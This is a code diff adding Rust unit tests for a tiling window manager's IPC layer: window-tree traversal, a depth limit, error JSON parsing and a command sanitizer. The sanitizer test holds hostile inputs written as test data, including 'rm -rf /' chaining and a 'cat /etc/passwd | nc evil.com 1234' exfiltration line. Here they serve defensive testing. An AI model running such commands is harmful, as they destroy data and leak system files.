@@ -844,4 +844,555 @@ mod tests {
         });
         assert!(find_focused_window(&tree).is_none());
     }
+
+    #[test]
+    fn deeply_nested_containers() {
+        // 5 levels: root→output→workspace→split_h→split_v→tabbed→con(window)
+        let tree = serde_json::json!({
+            "type": "root",
+            "nodes": [{
+                "type": "output",
+                "name": "DP-1",
+                "nodes": [{
+                    "type": "workspace",
+                    "name": "3",
+                    "num": 3,
+                    "nodes": [{
+                        "type": "con",
+                        "layout": "splith",
+                        "nodes": [{
+                            "type": "con",
+                            "layout": "splitv",
+                            "nodes": [{
+                                "type": "con",
+                                "layout": "tabbed",
+                                "nodes": [{
+                                    "type": "con",
+                                    "id": 77,
+                                    "name": "Deep Window",
+                                    "app_id": "deep-app",
+                                    "pid": 7777,
+                                    "focused": false,
+                                    "fullscreen_mode": 0,
+                                    "nodes": [],
+                                    "floating_nodes": []
+                                }],
+                                "floating_nodes": []
+                            }],
+                            "floating_nodes": []
+                        }],
+                        "floating_nodes": []
+                    }],
+                    "floating_nodes": []
+                }],
+                "floating_nodes": []
+            }],
+            "floating_nodes": []
+        });
+
+        let mut clients = Vec::new();
+        let ws = WmWorkspace {
+            id: 0,
+            name: String::new(),
+        };
+        collect_windows_with_context(&tree, &mut clients, &ws, 0, false);
+        assert_eq!(clients.len(), 1);
+        assert_eq!(clients[0].class, "deep-app");
+        assert_eq!(clients[0].id, "77");
+        assert_eq!(clients[0].workspace.name, "3");
+        assert_eq!(clients[0].workspace.id, 3);
+    }
+
+    #[test]
+    fn tabbed_stacked_layouts() {
+        let tree = serde_json::json!({
+            "type": "root",
+            "nodes": [{
+                "type": "output",
+                "name": "DP-1",
+                "nodes": [{
+                    "type": "workspace",
+                    "name": "1",
+                    "num": 1,
+                    "nodes": [{
+                        "type": "con",
+                        "layout": "tabbed",
+                        "nodes": [
+                            {
+                                "type": "con",
+                                "id": 101,
+                                "name": "Tab 1",
+                                "app_id": "tab-app-1",
+                                "pid": 1001,
+                                "focused": false,
+                                "fullscreen_mode": 0,
+                                "nodes": [],
+                                "floating_nodes": []
+                            },
+                            {
+                                "type": "con",
+                                "id": 102,
+                                "name": "Tab 2",
+                                "app_id": "tab-app-2",
+                                "pid": 1002,
+                                "focused": false,
+                                "fullscreen_mode": 0,
+                                "nodes": [],
+                                "floating_nodes": []
+                            },
+                            {
+                                "type": "con",
+                                "id": 103,
+                                "name": "Tab 3",
+                                "app_id": "tab-app-3",
+                                "pid": 1003,
+                                "focused": false,
+                                "fullscreen_mode": 0,
+                                "nodes": [],
+                                "floating_nodes": []
+                            }
+                        ],
+                        "floating_nodes": []
+                    }],
+                    "floating_nodes": []
+                }],
+                "floating_nodes": []
+            }],
+            "floating_nodes": []
+        });
+
+        let mut clients = Vec::new();
+        let ws = WmWorkspace {
+            id: 0,
+            name: String::new(),
+        };
+        collect_windows_with_context(&tree, &mut clients, &ws, 0, false);
+        assert_eq!(clients.len(), 3);
+        assert_eq!(clients[0].class, "tab-app-1");
+        assert_eq!(clients[1].class, "tab-app-2");
+        assert_eq!(clients[2].class, "tab-app-3");
+        // All should belong to workspace "1"
+        for client in &clients {
+            assert_eq!(client.workspace.name, "1");
+            assert_eq!(client.workspace.id, 1);
+        }
+    }
+
+    #[test]
+    fn multiple_workspaces_per_output() {
+        let tree = serde_json::json!({
+            "type": "root",
+            "nodes": [{
+                "type": "output",
+                "name": "DP-1",
+                "nodes": [
+                    {
+                        "type": "workspace",
+                        "name": "1",
+                        "num": 1,
+                        "nodes": [
+                            {
+                                "type": "con",
+                                "id": 201,
+                                "name": "WS1 App A",
+                                "app_id": "ws1-a",
+                                "pid": 2001,
+                                "focused": false,
+                                "fullscreen_mode": 0,
+                                "nodes": [],
+                                "floating_nodes": []
+                            },
+                            {
+                                "type": "con",
+                                "id": 202,
+                                "name": "WS1 App B",
+                                "app_id": "ws1-b",
+                                "pid": 2002,
+                                "focused": false,
+                                "fullscreen_mode": 0,
+                                "nodes": [],
+                                "floating_nodes": []
+                            }
+                        ],
+                        "floating_nodes": []
+                    },
+                    {
+                        "type": "workspace",
+                        "name": "2",
+                        "num": 2,
+                        "nodes": [{
+                            "type": "con",
+                            "id": 203,
+                            "name": "WS2 App",
+                            "app_id": "ws2-app",
+                            "pid": 2003,
+                            "focused": false,
+                            "fullscreen_mode": 0,
+                            "nodes": [],
+                            "floating_nodes": []
+                        }],
+                        "floating_nodes": []
+                    }
+                ],
+                "floating_nodes": []
+            }],
+            "floating_nodes": []
+        });
+
+        let mut clients = Vec::new();
+        let ws = WmWorkspace {
+            id: 0,
+            name: String::new(),
+        };
+        collect_windows_with_context(&tree, &mut clients, &ws, 0, false);
+        assert_eq!(clients.len(), 3);
+        // First two windows on workspace "1"
+        assert_eq!(clients[0].workspace.name, "1");
+        assert_eq!(clients[0].workspace.id, 1);
+        assert_eq!(clients[1].workspace.name, "1");
+        assert_eq!(clients[1].workspace.id, 1);
+        // Third window on workspace "2"
+        assert_eq!(clients[2].workspace.name, "2");
+        assert_eq!(clients[2].workspace.id, 2);
+        assert_eq!(clients[2].class, "ws2-app");
+    }
+
+    #[test]
+    fn mixed_x11_and_wayland_windows() {
+        let tree = serde_json::json!({
+            "type": "root",
+            "nodes": [{
+                "type": "output",
+                "name": "DP-1",
+                "nodes": [{
+                    "type": "workspace",
+                    "name": "1",
+                    "num": 1,
+                    "nodes": [
+                        {
+                            "type": "con",
+                            "id": 301,
+                            "name": "Firefox",
+                            "app_id": "firefox",
+                            "pid": 3001,
+                            "focused": false,
+                            "fullscreen_mode": 0,
+                            "nodes": [],
+                            "floating_nodes": []
+                        },
+                        {
+                            "type": "con",
+                            "id": 302,
+                            "name": "Steam",
+                            "app_id": null,
+                            "pid": 3002,
+                            "focused": false,
+                            "fullscreen_mode": 0,
+                            "window_properties": {
+                                "class": "steam",
+                                "instance": "steam",
+                                "title": "Steam"
+                            },
+                            "nodes": [],
+                            "floating_nodes": []
+                        }
+                    ],
+                    "floating_nodes": []
+                }],
+                "floating_nodes": []
+            }],
+            "floating_nodes": []
+        });
+
+        let mut clients = Vec::new();
+        let ws = WmWorkspace {
+            id: 0,
+            name: String::new(),
+        };
+        collect_windows_with_context(&tree, &mut clients, &ws, 0, false);
+        assert_eq!(clients.len(), 2);
+        // Wayland window uses app_id
+        assert_eq!(clients[0].class, "firefox");
+        assert_eq!(clients[0].id, "301");
+        // X11 window uses window_properties.class
+        assert_eq!(clients[1].class, "steam");
+        assert_eq!(clients[1].id, "302");
+    }
+
+    #[test]
+    fn scratchpad_workspace_skipped() {
+        let tree = serde_json::json!({
+            "type": "root",
+            "nodes": [{
+                "type": "output",
+                "name": "DP-1",
+                "nodes": [
+                    {
+                        "type": "workspace",
+                        "name": "1",
+                        "num": 1,
+                        "nodes": [{
+                            "type": "con",
+                            "id": 401,
+                            "name": "Normal App",
+                            "app_id": "normal-app",
+                            "pid": 4001,
+                            "focused": false,
+                            "fullscreen_mode": 0,
+                            "nodes": [],
+                            "floating_nodes": []
+                        }],
+                        "floating_nodes": []
+                    },
+                    {
+                        "type": "workspace",
+                        "name": "__i3_scratch",
+                        "num": -1,
+                        "nodes": [{
+                            "type": "con",
+                            "id": 402,
+                            "name": "Scratchpad App",
+                            "app_id": "scratch-app",
+                            "pid": 4002,
+                            "focused": false,
+                            "fullscreen_mode": 0,
+                            "nodes": [],
+                            "floating_nodes": []
+                        }],
+                        "floating_nodes": []
+                    }
+                ],
+                "floating_nodes": []
+            }],
+            "floating_nodes": []
+        });
+
+        let mut clients = Vec::new();
+        let ws = WmWorkspace {
+            id: 0,
+            name: String::new(),
+        };
+        collect_windows_with_context(&tree, &mut clients, &ws, 0, false);
+        // Only the normal workspace window should be collected
+        assert_eq!(clients.len(), 1);
+        assert_eq!(clients[0].class, "normal-app");
+        assert_eq!(clients[0].id, "401");
+    }
+
+    #[test]
+    fn depth_limit_prevents_overflow() {
+        // Build a tree 130 levels deep (exceeds MAX_TREE_DEPTH of 128).
+        // Start with the innermost window node.
+        let mut node = serde_json::json!({
+            "type": "con",
+            "id": 999,
+            "name": "Too Deep",
+            "app_id": "deep-app",
+            "pid": 9999,
+            "focused": false,
+            "fullscreen_mode": 0,
+            "nodes": [],
+            "floating_nodes": []
+        });
+        // Wrap it in 130 layers of container nodes
+        for _ in 0..130 {
+            node = serde_json::json!({
+                "type": "con",
+                "nodes": [node],
+                "floating_nodes": []
+            });
+        }
+
+        let mut clients = Vec::new();
+        let ws = WmWorkspace {
+            id: 0,
+            name: "1".to_string(),
+        };
+        // Call collect_windows_with_context directly; traversal starts at depth 0
+        collect_windows_with_context(&node, &mut clients, &ws, 0, false);
+        // The window is 131 levels down (130 wrappers + 1 window node),
+        // which exceeds MAX_TREE_DEPTH (128), so it should NOT be collected
+        assert!(
+            clients.is_empty(),
+            "window beyond MAX_TREE_DEPTH should not be collected"
+        );
+    }
+
+    #[test]
+    fn floating_windows_detected_correctly() {
+        let tree = serde_json::json!({
+            "type": "root",
+            "nodes": [{
+                "type": "output",
+                "name": "DP-1",
+                "nodes": [{
+                    "type": "workspace",
+                    "name": "1",
+                    "num": 1,
+                    "nodes": [{
+                        "type": "con",
+                        "id": 501,
+                        "name": "Tiled App",
+                        "app_id": "tiled-app",
+                        "pid": 5001,
+                        "focused": false,
+                        "fullscreen_mode": 0,
+                        "nodes": [],
+                        "floating_nodes": []
+                    }],
+                    "floating_nodes": [{
+                        "type": "floating_con",
+                        "nodes": [{
+                            "type": "con",
+                            "id": 502,
+                            "name": "Floating App",
+                            "app_id": "floating-app",
+                            "pid": 5002,
+                            "focused": false,
+                            "fullscreen_mode": 0,
+                            "nodes": [],
+                            "floating_nodes": []
+                        }],
+                        "floating_nodes": []
+                    }]
+                }],
+                "floating_nodes": []
+            }],
+            "floating_nodes": []
+        });
+
+        let mut clients = Vec::new();
+        let ws = WmWorkspace {
+            id: 0,
+            name: String::new(),
+        };
+        collect_windows_with_context(&tree, &mut clients, &ws, 0, false);
+        assert_eq!(clients.len(), 2);
+        // Tiled window
+        let tiled = clients.iter().find(|c| c.id == "501").unwrap();
+        assert!(!tiled.floating);
+        assert_eq!(tiled.class, "tiled-app");
+        // Floating window
+        let floating = clients.iter().find(|c| c.id == "502").unwrap();
+        assert!(floating.floating);
+        assert_eq!(floating.class, "floating-app");
+    }
+
+    #[test]
+    fn window_without_app_id_or_properties_skipped() {
+        // A node with type "con" and a pid, but no app_id and no window_properties
+        let node = serde_json::json!({
+            "type": "con",
+            "id": 600,
+            "name": "Mystery Node",
+            "pid": 100,
+            "focused": false,
+            "fullscreen_mode": 0,
+            "nodes": [],
+            "floating_nodes": []
+        });
+        assert!(
+            !is_window_node(&node),
+            "node without app_id or window_properties should not be a window"
+        );
+        // Also verify it produces no client via node_to_wm_client
+        // (node_to_wm_client doesn't check is_window_node, but the class will be empty)
+        // The important thing is that collect_windows skips it
+        let tree = serde_json::json!({
+            "type": "root",
+            "nodes": [{
+                "type": "output",
+                "name": "DP-1",
+                "nodes": [{
+                    "type": "workspace",
+                    "name": "1",
+                    "num": 1,
+                    "nodes": [node],
+                    "floating_nodes": []
+                }],
+                "floating_nodes": []
+            }],
+            "floating_nodes": []
+        });
+        let mut clients = Vec::new();
+        let ws = WmWorkspace {
+            id: 0,
+            name: String::new(),
+        };
+        collect_windows_with_context(&tree, &mut clients, &ws, 0, false);
+        assert!(
+            clients.is_empty(),
+            "node without app_id or window_properties should be skipped"
+        );
+    }
+
+    #[test]
+    fn sanitize_exec_strips_dangerous_chars() {
+        // Plain command passes through
+        assert_eq!(super::super::sanitize_exec_command("firefox"), "firefox");
+
+        // Semicolons stripped (command chaining)
+        assert_eq!(
+            super::super::sanitize_exec_command("firefox; rm -rf /"),
+            "firefox rm -rf /"
+        );
+
+        // Dollar signs stripped (variable substitution)
+        assert_eq!(
+            super::super::sanitize_exec_command("echo $HOME"),
+            "echo HOME"
+        );
+
+        // Newlines stripped (command injection)
+        assert_eq!(
+            super::super::sanitize_exec_command("firefox\nrm -rf /"),
+            "firefoxrm -rf /"
+        );
+
+        // Backticks stripped (command substitution)
+        assert_eq!(
+            super::super::sanitize_exec_command("echo `whoami`"),
+            "echo whoami"
+        );
+
+        // Pipes stripped
+        assert_eq!(
+            super::super::sanitize_exec_command("cat /etc/passwd | nc evil.com 1234"),
+            "cat /etc/passwd  nc evil.com 1234"
+        );
+
+        // Ampersands stripped
+        assert_eq!(
+            super::super::sanitize_exec_command("evil && rm -rf /"),
+            "evil  rm -rf /"
+        );
+    }
+
+    #[test]
+    fn run_command_error_json() {
+        // Test the JSON parsing pattern used by run_command to detect errors.
+        // run_command itself requires a live socket, so we test the parsing logic directly.
+        let reply = serde_json::json!([{"success": false, "error": "No matching node"}]);
+        let results: Vec<serde_json::Value> =
+            serde_json::from_value(reply).expect("valid JSON array");
+
+        // Verify the error detection logic matches run_command's implementation
+        let first = results.first().expect("should have one result");
+        let success = first.get("success").and_then(|v| v.as_bool());
+        assert_eq!(success, Some(false));
+
+        let err_msg = first
+            .get("error")
+            .and_then(|v| v.as_str())
+            .unwrap_or("unknown error");
+        assert_eq!(err_msg, "No matching node");
+
+        // Also verify that a success response passes the check
+        let ok_reply = serde_json::json!([{"success": true}]);
+        let ok_results: Vec<serde_json::Value> =
+            serde_json::from_value(ok_reply).expect("valid JSON array");
+        let ok_first = ok_results.first().expect("should have one result");
+        let ok_success = ok_first.get("success").and_then(|v| v.as_bool());
+        assert_eq!(ok_success, Some(true));
+    }
 }
